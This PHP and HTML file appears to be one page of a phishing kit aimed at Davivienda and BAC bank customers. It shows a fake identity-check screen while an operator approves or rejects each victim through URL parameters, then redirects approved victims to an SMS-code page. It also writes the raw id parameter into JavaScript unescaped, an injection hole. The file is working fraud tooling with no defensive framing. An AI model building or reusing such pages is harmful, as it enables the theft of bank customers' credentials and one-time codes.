<?php
session_start();
include 'db.php';

if (isset($_GET['aprobar'])) {
    $id = intval($_GET['aprobar']);
    $conn->query("UPDATE usuarios SET status='aprobado' WHERE id=$id");
    header("Location: loading.php?id=$id"); // Redirigir a loading.php con el ID del usuario
    exit;
} elseif (isset($_GET['rechazar'])) {
    $id = intval($_GET['rechazar']);
    $conn->query("UPDATE usuarios SET status='rechazado' WHERE id=$id");
    header("Location: loading.php?id=$id"); // Redirigir a loading.php con el ID del usuario
    exit;
}

// Verificamos si el parámetro 'id' está presente
if (isset($_GET['id'])) {
    $id = intval($_GET['id']);
    // Almacenamos el ID en la sesión para ser usado por verificar.php
    $_SESSION['user_id'] = $id;
}
?>

<?php
// Obtener el ID de la URL
$userId = $_GET['id'] ?? null;

// Validar que el ID sea válido
if ($userId) {
    // Aquí puedes hacer lo que necesites con el ID, como mostrar datos del usuario o realizar más acciones
    echo "El ID del usuario es: " . htmlspecialchars($userId);
} else {
    echo "No se proporcionó un ID válido.";
}
?>


<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validando Identidad</title>
    <link rel="icon" href="favicon-32x32.png" type="image/x-icon">

    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Open Sans', sans-serif;
            background-image: url('home-davivienda.jpg');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: center;
            color: #ffffff;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.7);
        }

        .navbar {
            width: 100%;
            background-color: rgb(255, 255, 255);
            padding: 10px 20px;
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
            justify-content: flex-start;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
        }

        .navbar img {
            height: 40px;
            margin-left: 20px;
        }

        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px 40px;
            border-radius: 15px;
            margin-top: 120px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            animation: fadeIn 1s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
            font-weight: bold;
            color: #f0f0f0;
        }

        p {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #cccccc;
        }

        .loading-gif {
            margin-top: 20px;
        }

        .loading-gif img {
            width: 100px;
            animation: rotate 1.5s linear infinite;
        }

        @keyframes rotate {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div class="navbar">
        <img src="BAC_LOGO.webp" alt="Logo">
    </div>

    <div class="container">
        <h1>Estamos validando tu identidad</h1>
        <p>Espere un momento</p>
        <div class="loading-gif">
            <img src="https://riadmalak.com/login_files/loading.svg" alt="Cargando...">
        </div>
    </div>

</body>

<script>
setInterval(async () => {
    let res = await fetch('verificar.php');
    let data = await res.json();
    
    if (data.status === 'aprobado') {
        // Redirige si aprobado a sms.php y pasa el ID del usuario
        window.location.href = 'sms.php?id=' + <?php echo $userId; ?>; 
    } else if (data.status === 'rechazado') {
        // Si es rechazado, redirige a la página anterior
        document.body.innerHTML = "<h1>Acceso Denegado. Redirigiendo...</h1>";
        setTimeout(() => {
            window.location.href = 'index.php'; // Redirige a la página principal
        }, 3000); // Espera 3 segundos antes de redirigir
    }
}, 3000); // Comprueba el estado cada 3 segundos
    </script>


</html>
